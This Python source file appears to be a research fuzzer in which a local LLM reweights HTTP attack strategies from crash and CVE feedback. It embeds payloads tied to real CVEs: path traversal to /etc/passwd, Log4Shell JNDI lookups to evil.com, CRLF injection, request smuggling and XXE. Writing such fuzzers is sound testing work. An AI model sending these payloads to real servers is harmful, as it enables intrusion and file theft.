"""
LLM Feedback-Driven Fuzzer (Hybrid Approach)

This fuzzer uses boofuzz as the main fuzzing framework while leveraging
LLM to analyze feedback and dynamically adjust seed generation and
mutation strategies.

Memory-optimized with hybrid approach for stability.
"""

import json
import random
import copy
import gc
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field

from .base_fuzzer import BaseFuzzer, FuzzingPayload
from .boofuzz_baseline import BoofuzzSeedGenerator, BoofuzzMutator
from .llm_client import OllamaClient, FuzzingPrompts, extract_json_from_response


@dataclass
class FeedbackRecord:
    """Record of fuzzing feedback - memory optimized."""
    iteration: int
    payload_type: str
    method: str
    status_code: int
    crash: bool
    cve_count: int
    has_error: bool


@dataclass
class StrategyWeights:
    """Weights for different fuzzing strategies."""
    seed_methods: Dict[str, float] = field(default_factory=lambda: {
        "standard": 0.3,
        "path_focused": 0.2,
        "header_focused": 0.2,
        "body_focused": 0.15,
        "smuggling_focused": 0.15
    })

    mutation_types: Dict[str, float] = field(default_factory=lambda: {
        "path": 0.2,
        "method": 0.1,
        "header_value": 0.2,
        "header_add": 0.15,
        "body": 0.15,
        "encoding": 0.1,
        "special": 0.1
    })

    attack_types: Dict[str, float] = field(default_factory=lambda: {
        "path_traversal": 0.12,     # CVE-2024-53677 (Struts)
        "smuggling": 0.12,           # General smuggling
        "ssrf": 0.12,                # CVE-2024-38476 (mod_proxy)
        "response_splitting": 0.12,  # CVE-2024-24795
        "header_injection": 0.12,    # CVE-2024-27316 (HTTP/2)
        "php_cgi": 0.12,             # CVE-2024-4577
        "jenkins_cli": 0.12,         # CVE-2024-23897
        "tomcat_put": 0.16           # CVE-2025-24813
    })


class AdaptiveSeedGenerator:
    """Adaptive seed generator with memory-efficient path/header storage."""

    # Class-level constants to avoid per-instance allocation (2024-2025 CVEs)
    PATH_TRAVERSAL = [
        "/../../../etc/passwd",
        "/..%2f..%2fetc/passwd",
        "/.%2e/.%2e/etc/passwd",
        "/..%252f..%252fetc/passwd",  # CVE-2024-53677 double encoding
        "/%c0%ae%c0%ae/etc/passwd",   # Overlong UTF-8
    ]
    PATH_ADMIN = ["/admin", "/manager/html", "/console", "/sessions/"]
    PATH_CONFIG = ["/.git/config", "/.env", "/config.json"]
    PATH_TOMCAT = ["/shell.jsp", "/test.jspx", "/manager/text/deploy"]  # CVE-2025-24813
    PATH_PHP_CGI = ["/cgi-bin/php-cgi", "/php-cgi/php-cgi.exe"]  # CVE-2024-4577
    PATH_JENKINS = ["/cli", "/cli?remoting=false", "/jnlpJars/jenkins-cli.jar"]  # CVE-2024-23897

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self._counter = 0

    def generate(self, weights: StrategyWeights) -> FuzzingPayload:
        """Generate a seed based on weighted strategies."""
        self._counter += 1
        method_type = self._weighted_choice(weights.seed_methods)

        if method_type == "path_focused":
            return self._generate_path_focused(weights)
        elif method_type == "header_focused":
            return self._generate_header_focused(weights)
        elif method_type == "body_focused":
            return self._generate_body_focused()
        elif method_type == "smuggling_focused":
            return self._generate_smuggling_focused()
        else:
            return self._generate_standard()

    def _weighted_choice(self, weights: Dict[str, float]) -> str:
        items = list(weights.keys())
        weight_values = [weights[k] for k in items]
        total = sum(weight_values)
        normalized = [w / total for w in weight_values]
        return random.choices(items, weights=normalized)[0]

    def _generate_standard(self) -> FuzzingPayload:
        return FuzzingPayload(
            method=random.choice(["GET", "POST", "PUT", "DELETE"]),
            path=random.choice(["/", "/api", "/admin", "/test"]),
            headers={"Host": f"{self.target_host}:{self.target_port}", "User-Agent": "HyFuzz/1.0"},
            seed_id=f"std_{self._counter}",
            generation_method="adaptive_standard"
        )

    def _generate_path_focused(self, weights: StrategyWeights) -> FuzzingPayload:
        attack_type = self._weighted_choice(weights.attack_types)
        if attack_type == "path_traversal":
            path = random.choice(self.PATH_TRAVERSAL)
        elif attack_type == "tomcat_put":
            path = random.choice(self.PATH_TOMCAT)
        elif attack_type == "php_cgi":
            path = random.choice(self.PATH_PHP_CGI)
        elif attack_type == "jenkins_cli":
            path = random.choice(self.PATH_JENKINS)
        elif attack_type == "ssrf":
            path = random.choice(self.PATH_CONFIG)
        else:
            path = random.choice(self.PATH_ADMIN)

        return FuzzingPayload(
            method="GET", path=path,
            headers={"Host": f"{self.target_host}:{self.target_port}"},
            seed_id=f"path_{self._counter}",
            generation_method="adaptive_path_focused"
        )

    def _generate_header_focused(self, weights: StrategyWeights) -> FuzzingPayload:
        attack_type = self._weighted_choice(weights.attack_types)
        headers = {"Host": f"{self.target_host}:{self.target_port}"}

        if attack_type == "header_injection":
            # CVE-2024-27316: HTTP/2 CONTINUATION
            headers["X-HTTP2-Continuation"] = "true"
        elif attack_type == "response_splitting":
            # CVE-2024-24795: Response Splitting
            headers["Referer"] = "http://evil.com%0d%0aSet-Cookie:%20evil=true"
        elif attack_type == "smuggling":
            headers["Transfer-Encoding"] = "chunked"
        elif attack_type == "ssrf":
            # CVE-2024-38476: mod_proxy
            headers["X-Forwarded-For"] = "127.0.0.1"
        elif attack_type == "tomcat_put":
            # CVE-2025-24813: Partial PUT
            headers["Content-Range"] = "bytes 0-100/101"
        elif attack_type == "jenkins_cli":
            # CVE-2024-23897: File Read
            headers["X-Jenkins-CLI"] = "@/etc/passwd"
        else:
            headers["X-Original-URL"] = "/admin"

        return FuzzingPayload(
            method="GET", path="/", headers=headers,
            seed_id=f"header_{self._counter}",
            generation_method="adaptive_header_focused"
        )

    def _generate_body_focused(self) -> FuzzingPayload:
        # Reduced body sizes to save memory
        bodies = [
            '{"admin":true}',
            '<?xml version="1.0"?><foo>&xxe;</foo>',
            "field=" + "A" * 100,  # Reduced from 1000
        ]
        return FuzzingPayload(
            method="POST", path="/api",
            headers={"Host": f"{self.target_host}:{self.target_port}", "Content-Type": "application/json"},
            body=random.choice(bodies),
            seed_id=f"body_{self._counter}",
            generation_method="adaptive_body_focused"
        )

    def _generate_smuggling_focused(self) -> FuzzingPayload:
        return FuzzingPayload(
            method="POST", path="/",
            headers={"Host": f"{self.target_host}:{self.target_port}",
                     "Transfer-Encoding": "chunked", "Content-Length": "4"},
            body="0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
            seed_id=f"smuggle_{self._counter}",
            generation_method="adaptive_smuggling_focused"
        )


class AdaptiveMutator:
    """Memory-efficient adaptive mutator."""

    def __init__(self):
        self._counter = 0

    def mutate(self, payload: FuzzingPayload, weights: StrategyWeights) -> FuzzingPayload:
        self._counter += 1
        mutation_type = self._weighted_choice(weights.mutation_types)

        # Create new payload with shallow copy of headers
        headers = dict(payload.headers) if payload.headers else {}

        mutated = FuzzingPayload(
            method=payload.method,
            path=payload.path,
            headers=headers,
            body=payload.body,
            seed_id=payload.seed_id,
            mutation_id=f"mut_{self._counter}",
            generation_method=f"adaptive_{mutation_type}"
        )

        # Apply mutation in-place
        if mutation_type == "path":
            self._mutate_path(mutated, weights)
        elif mutation_type == "method":
            mutated.method = random.choice(["TRACE", "CONNECT", "PROPFIND", "OPTIONS"])
        elif mutation_type == "header_value":
            self._mutate_header_value(mutated, weights)
        elif mutation_type == "header_add":
            self._mutate_header_add(mutated, weights)
        elif mutation_type == "body":
            mutated.body = random.choice(['{"admin":true}', "A" * 500, '{"$ne":null}'])
        elif mutation_type == "encoding":
            import urllib.parse
            mutated.path = urllib.parse.quote(mutated.path, safe="")
        elif mutation_type == "special":
            self._apply_special(mutated, weights)

        return mutated

    def _weighted_choice(self, weights: Dict[str, float]) -> str:
        items = list(weights.keys())
        weight_values = [weights[k] for k in items]
        total = sum(weight_values)
        normalized = [w / total for w in weight_values]
        return random.choices(items, weights=normalized)[0]

    def _mutate_path(self, payload: FuzzingPayload, weights: StrategyWeights):
        attack = self._weighted_choice(weights.attack_types)
        suffixes = {
            "path_traversal": "/../../../etc/passwd",
            "ssrf": "?url=http://127.0.0.1",
            "log4shell": "/${jndi:ldap://x}",
            "overflow": "/" + "A" * 500,  # Reduced from 5000
            "header_injection": "%0d%0aX-Injected:true",
        }
        payload.path = payload.path + suffixes.get(attack, "/../")

    def _mutate_header_value(self, payload: FuzzingPayload, weights: StrategyWeights):
        if payload.headers:
            header = random.choice(list(payload.headers.keys()))
            attack = self._weighted_choice(weights.attack_types)
            values = {
                "log4shell": "${jndi:ldap://evil.com/a}",
                "ssrf": "http://127.0.0.1",
                "overflow": "A" * 500,  # Reduced from 5000
                "header_injection": "val\r\nX-Injected:true",
            }
            payload.headers[header] = values.get(attack, "A" * 50)

    def _mutate_header_add(self, payload: FuzzingPayload, weights: StrategyWeights):
        attack = self._weighted_choice(weights.attack_types)
        headers_map = {
            "ssrf": ("X-Forwarded-For", "127.0.0.1"),
            "log4shell": ("X-Api-Version", "${jndi:ldap://x}"),
            "smuggling": ("Transfer-Encoding", "chunked"),
            "method_confusion": ("X-HTTP-Method-Override", "DELETE"),
        }
        header, value = headers_map.get(attack, ("X-Test", "test"))
        payload.headers[header] = value

    def _apply_special(self, payload: FuzzingPayload, weights: StrategyWeights):
        attack = self._weighted_choice(weights.attack_types)
        if attack == "smuggling":
            payload.headers["Transfer-Encoding"] = "chunked"
            payload.headers["Content-Length"] = "4"
            payload.body = "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
        elif attack == "log4shell":
            payload.headers["User-Agent"] = "${jndi:ldap://evil.com/a}"


class LLMFeedbackFuzzer(BaseFuzzer):
    """
    Feedback-driven fuzzer with hybrid approach and aggressive memory management.

    - Uses boofuzz for most seeds/mutations (fast, stable)
    - LLM only for periodic weight adjustments based on feedback
    - Minimal memory footprint
    """

    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 8080,
        llm_base_url: str = "http://localhost:11434",
        llm_model: str = "qwen3:8b",
        llm_timeout: int = 60,
        llm_temperature: float = 0.7,
        feedback_interval: int = 10,  # Adjust weights every 10 iterations
        **kwargs
    ):
        super().__init__(target_host=target_host, target_port=target_port, **kwargs)

        self.llm_client = OllamaClient(
            base_url=llm_base_url,
            model=llm_model,
            timeout=llm_timeout,
            temperature=llm_temperature
        )

        # Use standard boofuzz for generation (fast, reliable)
        self.boofuzz_seed_generator = BoofuzzSeedGenerator(target_host, target_port)
        self.boofuzz_mutator = BoofuzzMutator()

        # Weights for LLM feedback (used for analysis only)
        self.weights = StrategyWeights()
        self.feedback_interval = feedback_interval

        # Ultra-aggressive memory limits
        self._feedback_history: List[FeedbackRecord] = []
        self._weight_adjustments = 0
        self._last_feedback_iteration = 0
        self._total_cves = 0
        self._total_crashes = 0
        self._llm_calls = 0

        # Only keep last 10 records - that's all we need
        self._max_history = 10

        self.logger.info(f"Initialized LLMFeedbackFuzzer: model={llm_model}, feedback_interval={feedback_interval}")

    @property
    def variant_name(self) -> str:
        return "llm_feedback"

    def generate_seed(self) -> FuzzingPayload:
        """Generate seed using boofuzz only (LLM just adjusts weights)."""
        return self.boofuzz_seed_generator.generate()

    def mutate(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate using boofuzz only (LLM just adjusts weights)."""
        return self.boofuzz_mutator.mutate(payload)

    def analyze_response(self, payload, response, error):
        result = super().analyze_response(payload, response, error)

        cve_list = result.get("cve_triggered", [])
        crash = result.get("crash_detected", False)

        # Track totals (just integers, no memory growth)
        if cve_list:
            self._total_cves += len(cve_list)
        if crash:
            self._total_crashes += 1

        # Only store minimal feedback record
        record = FeedbackRecord(
            iteration=self._iteration_count,
            payload_type=(payload.generation_method or "unknown")[:20],
            method=payload.method,
            status_code=result.get("status_code") or 0,
            crash=crash,
            cve_count=len(cve_list),
            has_error=bool(error)
        )
        self._feedback_history.append(record)

        # Trigger feedback analysis every 10 iterations
        if self._iteration_count - self._last_feedback_iteration >= self.feedback_interval:
            self._analyze_feedback_and_adjust()
            self._last_feedback_iteration = self._iteration_count
            # Clear history after analysis - we only need last 10 for next round
            self._feedback_history.clear()
            gc.collect()

        return result

    def _analyze_feedback_and_adjust(self):
        """Analyze feedback every 10 iterations and adjust weights via LLM."""
        if not self._feedback_history:
            return

        self._llm_calls += 1

        # Use last 10 records for analysis
        recent = self._feedback_history[-min(10, len(self._feedback_history)):]
        crash_count = sum(1 for r in recent if r.crash)
        cve_count = sum(r.cve_count for r in recent)
        error_count = sum(1 for r in recent if r.has_error)

        # Concise prompt for frequent calls
        prompt = f"""Fuzzing stats (last 10): crashes={crash_count}, CVEs={cve_count}, errors={error_count}
Current: {json.dumps(self.weights.attack_types)}

Increase weights for attack types that found CVEs/crashes. Output JSON only.
Example: {{"path_traversal":0.2,"smuggling":0.15,"ssrf":0.15,"log4shell":0.15,"header_injection":0.15,"method_confusion":0.1,"overflow":0.1}}

New weights:"""

        response = self.llm_client.generate(
            prompt=prompt,
            system_prompt="Output attack type weights as JSON. Higher weight = more focus.",
            temperature=0.6
        )

        if not response.success:
            self.logger.debug("[Feedback] LLM failed, keeping weights")
            return

        # Parse and apply
        data = extract_json_from_response(response.content, logger=self.logger)
        if data and isinstance(data, dict):
            if all(k in data for k in self.weights.attack_types.keys()):
                try:
                    new_weights = {k: float(data[k]) for k in self.weights.attack_types.keys()}
                    total = sum(new_weights.values())
                    if total > 0:
                        self.weights.attack_types = {k: v/total for k, v in new_weights.items()}
                        self._weight_adjustments += 1
                        self.logger.info(f"[Feedback] Weight adjustment #{self._weight_adjustments}: top={max(self.weights.attack_types, key=self.weights.attack_types.get)}")
                except (ValueError, TypeError):
                    pass

    def get_stats(self) -> Dict[str, Any]:
        stats = super().get_stats()
        stats.update({
            "weight_adjustments": self._weight_adjustments,
            "feedback_records": len(self._feedback_history),
            "total_cves_found": self._total_cves,
            "total_crashes": self._total_crashes,
            "llm_calls": self._llm_calls,
            "feedback_interval": self.feedback_interval,
            "current_weights": self.weights.attack_types,
            "llm_stats": self.llm_client.get_stats()
        })
        return stats
